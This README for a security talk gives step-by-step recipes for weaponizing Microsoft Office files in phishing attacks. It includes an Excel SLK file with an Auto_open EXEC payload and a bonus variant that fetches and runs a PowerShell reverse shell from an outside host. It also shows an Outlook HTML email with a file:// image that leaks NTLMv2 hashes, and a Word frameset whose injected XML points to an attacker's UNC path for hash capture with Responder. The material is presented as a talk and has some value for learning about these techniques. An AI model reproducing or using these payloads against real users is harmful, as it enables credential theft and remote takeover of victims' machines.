# Weaponizing-Office
twitter: [iKnadt](https://twitter.com/iKnadt)

## Introduction:
I did a talk at [0xC0ffee](https://0xc0ffee.co.za), where I discussed different ways to weaponize microsoft office.
What was different about the talk, was that these methods have been discovered prior to 2018, and did not require a lot of user interaction to execute the payloads. These methods work great with phishing attacks.

I decided not to use a standard way to present my talk, so [@MTB_m00se](https://twitter.com/MTB_m00se) introduced me to terminal markdown where I found [patat](https://github.com/jaspervdj/patat)

I recently discovered a tool called [Responder[(https://github.com/SpiderLabs/Responder), which I used in my talk.
I mainly used Responder to capture NTLMv2 hashes from victom machines.

I found a great [article](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4) explaining what is NTLMv2 hashes and what can be done with it.

Below is a short extract from the article:
> This is the way passwords are stored on modern Windows systems, and can be obtained by dumping the SAM database, or using Mimikatz. They are also stored on domain controllers in the NTDS file. These are the hashes you can use to pass-the-hash.

## Contents:

1. Excel (.SLK)
2. Outlook (file://)
3. Word (frameset)

A common finding in penetration tests is that clients are not properly managing egress packet filtering from their network to the internet. This post specifically talks about the dangers of allowing egress of SMB communications over port 445 to the internet, and one simple method of exploiting it to capture a user's credentials, crack them, and gain access to the network.

Objective is to capture NTLMv2 hashes by using the above programs. The user should not have to do more than 1 click after downloading the office file. 

```BONUS: will try to get reverse shells as well```

## 1. Excel (.SLK)

> An SLK file is a file saved in the Symbolic Link (SYLK) format created by Microsoft to transfer data between spreadsheet programs and other databases. 

I found this exploit on [ired.team](https://ired.team/offensive-security/phishing-with-ms-office/phishing-.slk-excel) which gave a great walkthrough oh how to exactact perform RCE in an SLK file.

### Excel RCE 

#### Setup
1. Create an new text file, put the the below code and save it as .slk file:
```
ID;P
O;E
NN;NAuto_open;ER101C1;KOut Flank;F
C;X1;Y101;K0;EEXEC("c:\shell.cmd")
C;X1;Y102;K0;EHALT()
E
```
2. DONE `HOLY SHIT THAT WAS HARD!!`

#### Capture NTLMv2 Hash

Setup Responder `./Responder.py -I ens4 -vvv`

Replace `c:\shell.cmd` with `cmd.exe /c \\IP\IPC$`. Please make sure the IP is your IP.

Once the file.slk is opened the user will need to click on `Enable Content`. Once the user clicks the button the payload is executed. Once the button is clicked Excel, every time after that the payload will be executed when the file is openned (Unless the files is renamed).

![](excel_NTLMv2_hash_capture.gif)

#### Excel RCE - Powershell Reverse shell(BONUS)

1. Change the `cmd.exe /c \\IP\IPC$` to 

````
	powershell IEX 
	(New-Object Net.WebClient).DownloadString(
	'http://192.168.56.101/test.ps1')
````
2. set up `test.ps1` on a server. 
test.ps1 is a [powershell reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)

DONE...

![](excel_NTLMv2_hash_reverse.gif)

More on [Symbolic Link](https://en.wikipedia.org/wiki/SYmbolic_LinK_(SYLK)) files

## 2. Outlook (file://)

### Steps:
1. Create HTML email
2. `<img src="file://IP/fakeimage.png" />`
3. Send email! Important!

![](outlook_capture_hash.gif)

NOTE: `the user only needs to download the image once. As the POC shows, once the email is openned again, the hash is captured`

Though: can this be uses as a [DOS attack](https://www.kb.cert.org/vuls/id/867968/)?


## 3. Word (frameset)

> Historically Microsoft Word was used as an HTML editor. This means that it can support HTML elements such as framesets. It is therefore possible to link a Microsoft Word document with a UNC path and combing this with responder in order to capture NTLM hashes externally.

### Setup (more complicated)

1. Create a word document
2. Write anything into the document
3. Save Document
4. Right click on document -> Open archive
5. Edit \file.docx\word\webSettings.xml
6. Add the following to the file between `<w:optimizeForBrowser/>` xml tag

````
<w:frameset>
<w:framesetSplitbar>
<w:w w:val="60"/>
<w:color w:val="auto"/>
<w:noBorder/>
</w:framesetSplitbar>
<w:frameset>
<w:frame>
<w:name w:val="3"/>
<w:sourceFileName r:id="rId1"/>
<w:linkedToFile/>
</w:frame>
</w:frameset>
</w:frameset>
````

7. Create file \file.docx\word\_rels\webSettings.xml.rels

````
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships
xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="\\IP\Microsoft_Office_Updates.docx" TargetMode="External"/>
</Relationships>
````
8. DONE!!!

POC is too long to make a GIF

More information on [Framesets](https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/)
